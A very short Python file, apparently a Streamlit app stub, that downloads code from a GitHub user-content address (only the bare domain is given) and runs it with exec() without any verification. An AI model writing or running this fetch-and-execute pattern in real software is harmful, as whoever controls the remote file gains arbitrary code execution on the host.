import urllib.request
import streamlit as st

url = "https://githubusercontent.com"
exec(urllib.request.urlopen(url).read().decode('utf-8'))
